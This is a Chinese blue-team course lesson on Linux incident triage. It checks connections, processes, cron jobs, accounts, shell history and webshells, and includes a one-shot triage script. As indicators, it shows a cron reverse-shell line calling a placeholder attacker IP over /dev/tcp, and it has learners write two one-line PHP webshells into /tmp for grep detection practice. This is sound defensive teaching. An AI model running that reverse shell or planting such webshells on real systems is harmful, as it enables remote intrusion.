---
day: 24
title: Linux应急排查
phase: 第一阶段
difficulty: ⭐⭐ 基础
---

# Day 24：Linux应急排查

> **阶段**：第一阶段 · 蓝队极速上岗 | **难度**：⭐⭐ 基础 | **课时**：2-3小时

---

## 📋 今日学习目标

1. 掌握Linux系统的5项核心应急排查动作
2. 能排查异常进程和端口
3. 能检查定时任务和异常用户
4. 能通过history命令分析攻击者操作
5. 能在模拟环境中独立完成Linux应急排查

---

## 📖 核心知识讲解

### 一、Linux应急排查总览

与Windows类似，Linux排查也有标准顺序：

```
排查顺序：
① 网络连接 → 有没有可疑外连？（ss/netstat）
② 进程列表 → 有没有陌生进程？（ps aux）
③ 定时任务 → 有没有后门cron？（crontab -l + /etc/cron*）
④ 用户账户 → 有没有新创建的用户？（/etc/passwd）
⑤ 历史命令 → 攻击者执行了什么？（history / .bash_history）
⑥ 敏感文件 → 有没有webshell/后门脚本？（find）
⑦ 日志溯源 → 从日志反推攻击过程？（Day 10技能）
```

### 二、五项核心排查动作

#### 动作1：排查网络连接 —— "机器在和谁聊天？"

```bash
# 查看所有网络连接（推荐ss，更快）
ss -tunap

# 传统netstat
netstat -antup

# 输出解读：
# LISTEN     → 正在监听（等待别人连接）
# ESTABLISHED → 已建立连接（正在通信中）⚠️ 重点关注
# TIME_WAIT  → 连接已关闭，等待清理

# 只看已建立的连接
ss -tnp | grep ESTAB

# 查找可疑外连的特征：
# - 目的IP是境外陌生IP
# - 目的端口是非标准端口（非22/80/443）
# - 进程是php/nginx/tomcat等Web进程（Webshell后门特征！）
```

**可疑外连特征：**
```
Web服务器(nginx) → 外连境外IP:4444 🔴 极可疑！典型的反弹shell
普通用户进程(bash) → 外连随机IP:8080 🟡 可疑
php-fpm → 外连陌生IP:9999 🔴 Webshell通信特征
sshd → 外连多个IP的22端口 🟡 可能是跳板攻击
```

#### 动作2：排查进程 —— "混进了什么坏人？"

```bash
# 查看所有进程（最常用）
ps aux

# 按CPU使用率排序
ps aux --sort=-%cpu | head -20

# 按内存使用率排序
ps aux --sort=-%mem | head -20

# 查看进程树（父子关系更清楚）
ps auxf

# 查看隐藏进程（比较proc目录和ps输出）
ls /proc | grep -E '^[0-9]+$' > /tmp/proc_list.txt
ps aux | awk '{print $2}' > /tmp/ps_list.txt
diff /tmp/proc_list.txt /tmp/ps_list.txt
# 有差异 → 存在隐藏进程！可能是rootkit
```

**可疑进程特征：**
- 进程名是随机字符串（如`dkfj23`、`tmp1234`）
- 进程运行路径在`/tmp`或`/var/tmp`下
- 进程名伪装成系统进程但路径不对（如`nginx`从`/tmp/nginx`启动）
- CPU/内存使用异常高（可能是挖矿程序）
- COMMAND列包含`./`开头（当前目录执行，可疑）

#### 动作3：排查定时任务 —— "有没有定时炸弹？"

```bash
# 检查当前用户的定时任务
crontab -l

# 检查所有用户的定时任务
for user in $(cut -f1 -d: /etc/passwd); do
    echo "=== $user ==="
    crontab -u $user -l 2>/dev/null
done

# 检查系统级定时任务
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.monthly/
ls -la /etc/cron.weekly/

# 检查anacron任务（关机后补执行的）
cat /etc/anacrontab

# 检查cron日志
grep "CMD" /var/log/cron | tail -50
```

**可疑定时任务特征：**
- 每分钟执行一次（`* * * * *`）且执行的是/tmp下的脚本
- 执行的命令是反弹shell：
  ```
  */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/攻击IP/4444 0>&1'
  ```
- 执行的脚本是将自身添加到启动中

#### 动作4：排查用户与权限 —— "谁被偷偷加了进来？"

```bash
# 查看所有用户
cat /etc/passwd

# 查看有登录权限的用户（非nologin）
cat /etc/passwd | grep -v nologin | grep -v false

# 查看最近创建的用户（passwd文件按修改时间排序）
ls -lt /etc/passwd /etc/shadow /etc/group

# 查看UID为0的用户（只有root应该是0，多了就是后门）
awk -F: '($3 == 0) {print $1}' /etc/passwd

# 查看sudo权限
cat /etc/sudoers
grep -v '^#' /etc/sudoers | grep -v '^$'

# 查看当前登录用户
w
who
last | head -20       # 最近登录记录
lastlog               # 所有用户最近登录时间
```

**可疑用户特征：**
- UID=0但不叫root（后门管理员）
- 新建不久的莫名账户
- 账户有登录shell（/bin/bash）但你完全不认识

#### 动作5：排查历史命令与敏感文件 —— "攻击者做了什么？"

```bash
# 查看root的历史命令
cat /root/.bash_history | tail -100

# 查看所有用户的历史命令
cat /home/*/.bash_history 2>/dev/null

# 重点关注这些命令：
# wget/curl → 下载恶意文件
# chmod +x → 给后门加执行权限
# ./ 开头 → 执行当前目录文件
# iptables → 修改防火墙规则
# useradd → 创建后门账号
# crontab → 添加定时任务
# rm -rf → 删除日志/证据
# history -c → 清除历史命令（攻击者清除痕迹）

# 查找最近修改的文件（关注/tmp、/var/tmp、/dev/shm）
find /tmp -type f -mtime -1 -ls      # 最近1天修改的/tmp文件
find /var/tmp -type f -mtime -1 -ls
find /dev/shm -type f -ls             # 共享内存中的文件（常被利用）

# 查找Web目录下的可疑脚本
find /var/www -name "*.php" -mtime -7 -ls  # 最近7天的php文件
find /var/www -type f -name "*.php" -exec grep -l "eval\|base64_decode\|system\|exec" {} \;
# 查找含eval/base64_decode/system的php文件（常见webshell关键词）
```

### 三、应急排查一键脚本

```bash
#!/bin/bash
# Linux应急排查一键脚本
echo "===== 1. 系统信息 ====="
uname -a && uptime && whoami

echo "===== 2. 网络连接（ESTABLISHED）====="
ss -tnp | grep ESTAB

echo "===== 3. CPU最高的10个进程 ====="
ps aux --sort=-%cpu | head -10

echo "===== 4. 当前用户定时任务 ====="
crontab -l 2>/dev/null || echo "无"

echo "===== 5. 所有有登录权限的用户 ====="
grep -v '/nologin\|/false' /etc/passwd

echo "===== 6. UID=0的用户（应有且仅有root）====="
awk -F: '($3==0){print $1}' /etc/passwd

echo "===== 7. 最近10次登录 ====="
last | head -10

echo "===== 8. /tmp目录最近修改的文件 ====="
find /tmp -type f -mtime -1 -ls 2>/dev/null

echo "===== 9. 最近修改的cron任务 ====="
grep "CMD" /var/log/cron 2>/dev/null | tail -20

echo "===== 10. Web目录可疑php文件 ====="
find /var/www -name "*.php" -mtime -7 -ls 2>/dev/null
```

---

## 🔧 实操任务

### 任务1：在Kali中练习排查命令（20分钟）

在Kali Linux虚拟机中执行上述所有排查命令，观察你系统的正常状态是什么样的：

```bash
# 一个一个敲，看看正常系统长什么样
ss -tunap
ps aux --sort=-%cpu | head -10
crontab -l
awk -F: '($3==0){print $1}' /etc/passwd
last | head -10
```

### 任务2：模拟应急排查（15分钟）

模拟以下场景：有人报告说Kali Linux虚拟机"运行变慢了"。请执行应急排查，检查是否存在以下问题：
- 有没有异常进程占用大量CPU？
- 有没有异常外连？
- 有没有可疑定时任务？
- /tmp下有没有可疑文件？

### 任务3：webshell检测练习（10分钟）

```bash
# 在/tmp下创建几个"可疑"文件进行模拟
echo '<?php @eval($_POST[cmd]);?>' > /tmp/test1.php
echo '<?php system($_GET[c]);?>' > /tmp/test2.php
echo 'hello world' > /tmp/normal.txt

# 用grep扫描
grep -rl "eval\|base64_decode\|system\|exec" /tmp/*.php 2>/dev/null
# 观察哪些文件被检出
```

---

## ✅ 验收标准

- [ ] 能独立完成Linux系统的5项核心排查
- [ ] 能通过ss/ps识别可疑连接和进程
- [ ] 能检查cron是否存在恶意定时任务
- [ ] 能检查/etc/passwd发现后门账号
- [ ] 能用grep扫描webshell特征
- [ ] 有自己的Linux应急排查命令速查表

---

## 📝 今日小结

Linux应急排查和Windows的逻辑一样，只是工具变成了Linux命令。看完今天的排查清单你会发现，基本上就是Day 4-5学的那些基础命令在安全场景下的组合应用。记住排查顺序：先看网络连接→再看进程→然后查持久化（cron/用户）→最后查文件。熟练了这些，遇到Linux被入侵不会再手足无措。

**记住今天的核心**：
- `ss -tnp` = 看网络连接，ESTABLISHED是重点
- `ps aux` = 看进程，路径异常/CPU异常是关键
- `crontab -l` = 看定时任务，每分钟执行的最可疑
- `awk -F: '($3==0)' /etc/passwd` = 看有没有隐藏的超级用户
- `/tmp` 下的文件 = 高度可疑

---

## 📚 延伸阅读（可选）

- 了解chkrootkit和rkhunter：Linux专用的rootkit检测工具
- 了解OSSEC：开源的主机入侵检测系统（HIDS）
